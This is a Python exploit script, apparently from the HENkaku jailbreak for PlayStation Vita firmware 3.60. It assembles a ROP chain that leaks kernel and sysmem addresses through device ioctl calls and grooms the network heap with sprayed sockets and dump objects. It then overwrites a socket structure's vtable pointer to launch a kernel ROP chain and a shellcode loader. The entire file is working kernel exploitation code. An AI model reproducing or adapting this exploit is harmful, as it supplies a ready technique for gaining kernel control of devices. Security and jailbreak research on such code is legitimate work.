#!/usr/bin/env python3
from os import sys, path
sys.path.append(path.join(path.dirname(path.dirname(path.abspath(__file__))), "build"))

from target_360 import Rop360, G, F
from util import p32, p8
from rop import Ret, Load
from krop import krop

from sys import argv, exit


thread_attr = 0x10000100
stack_size = 0x2000
need_sockets = 80
user_ropchain_len = 0x100
ldm_buf_size = 7 * 4
need_dumps = 11

stack_shellcode_offset = 0x300
sysmem_shellcode_offset = 0x27640
stack_rop_offset = 4
kstack_offset_to_data = 1784

normal_args = (2, 1, 0)
special_args = (17, 3, 0)

class RopThread:

    def __init__(self, rop):
        self.microrop = []
        self.rop = rop

    def create(self):
        r = self.rop
        c = r.caller
        d = r.data

        self.thread_id = r.pre_alloc_var(4)
        self.thread_info = r.pre_alloc_var(0x80)
        self.stack_base = r.pre_alloc_var(4)
        self.user_ropchain = r.pre_alloc_var(user_ropchain_len)
        self.ldm_buf = r.pre_alloc_var(ldm_buf_size)

        c.sceKernelCreateThread(d.empty_str, G.ldm_r1_stuff, thread_attr, stack_size, 0, 0, 0)
        c.store(Ret, self.thread_id)
        c.store(0x7C, self.thread_info)
        c.sceKernelGetThreadInfo(Load(self.thread_id), self.thread_info)
        # some free space for function calls
        c.add(Load(self.thread_info + 0x34), 0x1000)
        c.store(Ret, self.stack_base)

    def call(self, func, a1=0, a2=0, a3=0, a4=0, last_r4=0):
        self.microrop += [
            G.pop_r0_to_r5,
            a1,
            a2,
            a3,
            a4,
            func,
            0,
            G.blx_r4_pop_r4,
            last_r4,
        ]

    def infloop(self):
        self.microrop.append(G.infloop)

    def go(self):
        r = self.rop
        c = r.caller

        addr = self.user_ropchain
        for word in self.microrop:
            c.store(word, addr)
            addr += 4

        # copy user ropchain into user stack
        c.memcpy(Load(self.stack_base), self.user_ropchain, user_ropchain_len)
        # set up args for LDM user thread stack pivot
        c.store(Load(self.stack_base), self.ldm_buf+5*4)
        c.store(G.pop_pc, self.ldm_buf+6*4)
        c.sceKernelStartThread(Load(self.thread_id), ldm_buf_size, self.ldm_buf)


def create_dumps(rop, start, end, step, use_repeat=False):
    """
    Tries to create dumps in range [start; end], every step bytes
    end < start
    generally, only 1 dump should be created
    this is used to claim empty space
    """
    r = rop
    c = rop.caller
    d = rop.data

    if use_repeat:
        # Size of dump to allocate
        size = r.pre_alloc_var(p32(start))
        # How many iterations we need to perform
        iters = (start - end) // step

        r.repeat(iters, [
            # r1 = [size]
            G.pop_r1_pc,
            size,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc,
            G.ldr_r1_r1_blx_sb,

            # r0 = empty_str
            G.pop_r0_pc,
            d.empty_str,

            # r2 = 0
            G.pop_r2_pc,
            0,

            # call the function
            G.pop_r4_pc,
            F.sceNetDumpCreate_svc,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 = [size]
            G.pop_r0_pc,
            size,
            G.ldr_r0_r0_pop_r4_pc,
            0,

            # r0 -= step
            G.pop_r1_pc,
            (-step) & 0xFFFFFFFF,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # [size] = r0
            G.pop_r1_pc,
            size,
            G.str_r0_r1_pop_r4,
            0,
        ])
    else:
        for dump_sz in range(start, end-1, -step):
            c.sceNetDumpCreate_svc(d.empty_str, dump_sz, 0)


def make_rop(kx_loader, second_payload):
    r = Rop360()
    r.assume_null_init = True
    c = r.caller
    d = r.data

    r.pre_alloc_data(
        ioctl=0x400,

        sysmem_base=4,

        rop_thread_id=4,
        sockets=need_sockets*4,

        args_buf_first=0x10,
        args_buf_second=0x10,

        open_device_name="molecule0:",
        device_name="sdstor0:",
        command="gcd-lp-ign-gamero",

        our_data=0x1000,

        tester=4,

        pret=4,

        empty_str="",
        dumps_to_delete=need_dumps*4,
        dump_to_free=4,

        mybuf=0x100,
        krop=0x400,
        kx_loader_addr=4,

        kx_loader=kx_loader,
        second_payload = second_payload,

        kernel_stack_base=4,
    )

    c.sceIoOpen(d.open_device_name, 0, 0)
    # only leak sysmem from this call
    c.sceIoDevctl(d.device_name, 5, d.command, 0x14, d.ioctl, 0x3FF)

    c.add(Load(d.ioctl+0x3D4), -0x5747)
    c.store(Ret, d.sysmem_base)

    # -----8<-----------------------------------------------------------------------
    plant = RopThread(r)
    plant.create()

    c.store(0x14,    d.args_buf_first+0)
    c.store(d.ioctl, d.args_buf_first+4)
    c.store(0x3FF,   d.args_buf_first+8)

    c.store(0x400, d.args_buf_second+0)
    c.store(0,     d.args_buf_second+4)
    c.store(0,     d.args_buf_second+8)

    # sceIoOpen to populate kernel stack
    plant.call(F.sceIoOpen, d.open_device_name)
    # first devctl to leak stack/sysmem addr
    plant.call(F.sceIoDevctl_svc, d.device_name, 5, d.command, d.args_buf_first)
    # delay to sync our two threads
    plant.call(F.sceKernelDelayThread, 200 * 1000)
    # second devctl to plant our data into kmem
    plant.call(F.sceIoDevctl_svc, d.device_name, 5, d.our_data, d.args_buf_second)
    plant.infloop()

    plant.go()
    # ----->8-----------------------------------------------------------------------
    
    # sleep 0.1s
    c.sceKernelDelayThread(100 * 1000)


    c.add(Load(d.ioctl+0x3C4), -0xABC)
    c.store(Ret, d.kernel_stack_base)

    # set up data for kernel
    c.add(Load(d.sysmem_base), 0x1e460) # ldm R0, {R4,R10,R12,SP,PC}
    c.store(Ret, d.our_data) # future function ptr

    # layout: [ ldm_gadget ] [ kernel ropchain .... ] ... [ payload? ]
    # remember: we only have 0x400 bytes, and the less we use the better

    c.add(Load(d.kernel_stack_base), kstack_offset_to_data)
    c.add(Ret, stack_shellcode_offset)
    c.store(Ret, d.kx_loader_addr)

    krop(r)
    c.memcpy(d.our_data + stack_rop_offset, d.krop, 0x300)

    # set up shellcode
    c.memcpy(d.our_data + stack_shellcode_offset, d.kx_loader, 0x400)

    # after the plant thread wakes up, it should copy our_data into kernel stack

    # set up overwritten socket structure
    c.add(Load(d.kernel_stack_base), 1756)
    c.store(Ret, d.mybuf + 6 * 4) # vptr
    c.add(Load(d.kernel_stack_base), kstack_offset_to_data)
    c.add(Ret, stack_rop_offset)
    c.store(Ret, d.mybuf + 3 * 4) # sp
    c.add(Load(d.sysmem_base), 0x347) # pop {pc} to kick off the ropchain
    c.store(Ret, d.mybuf + 4 * 4)

    # create and set up rop thread that will call vulnerable syscall
    vuln = RopThread(r)
    vuln.create()

    # create a lot of sockets
    for x in range(need_sockets):
        c.socket(d.empty_str, *normal_args)
        c.store(Ret, d.sockets + 4 * x)
    
    c.socket(d.empty_str, *normal_args)

    c.socket(d.empty_str, *special_args)
    c.store(Ret, d.tester)

    c.socket(d.empty_str, *normal_args)

    vuln.call(F.sceNetSyscallIoctl, Load(d.tester), 0x10007300, 0, 0, d.pret)
    vuln.microrop += [
        G.str_r0_r4_pop_r4,
        0,
    ]
    vuln.infloop()

    for x in range(need_dumps):
        c.sceNetDumpCreate_svc(d.empty_str, 0xF00, 0)
        c.store(Ret, d.dumps_to_delete + 4 * x)
    
    c.sceNetDumpCreate_svc(d.empty_str, 0x2000, 0)
    c.store(Ret, d.dump_to_free)

    # free some memory and create holes
    for x in range(0, need_dumps, 2):
        c.sceNetDumpDestroy(Load(d.dumps_to_delete + 4 * x))

    create_dumps(r, 0x100000, 0xF40, 0x10, use_repeat=True)

    # it should hang
    vuln.go()

    c.sceKernelDelayThread(100 * 1000)
    # free sockets
    for x in range(0, need_sockets, 2):
        c.sceNetSyscallClose(Load(d.sockets + 4 * x))

    c.sceNetSyscallClose(Load(d.tester))
    for x in range(0x20):
        c.sceNetSyscallControl(0, 0x30000000, d.mybuf, 0xFC)
    c.sceNetDumpDestroy(Load(d.dump_to_free))

    c.sceKernelDelayThread(100 * 1000)

    # on success this will remain at 0, on error it will be -22
    c.add(Load(d.pret), G.bx_lr)
    # we continue user rop when kernel payload triggers and crash webkit otherwise
    # so it has a chance to try again
    r.call_r0()

    # free the dumps now, we need net memory for http stuff in usermode to work!
    for dump_id in range(0x1770, 0x1791):
        c.sceNetDumpDestroy(dump_id)

    r.infloop()

    r.compile()
    return r


def main():
    if len(argv) != 4:
        print("Usage: exploit.py kx-loader second-payload output-henkaku-bin")
        return 1

    with open(argv[1], "rb") as fin:
        kx_loader = fin.read()
    with open(argv[2], "rb") as fin:
        second_payload = fin.read()

    rop = make_rop(kx_loader, second_payload)

    # We're initialized to zero, no need to keep trailing relocs that are 0
    relocs = rop.compiled_relocs[:]
    while relocs[-1] == 0:
        del relocs[-1]

    with open(argv[3], "wb") as fout:
        for word in rop.compiled_rop:
            fout.write(p32(word))
        for reloc in relocs:
            fout.write(p8(reloc))

    # Print number of words to stdout
    print(len(rop.compiled_rop))

    return 0


if __name__ == "__main__":
    exit(main())
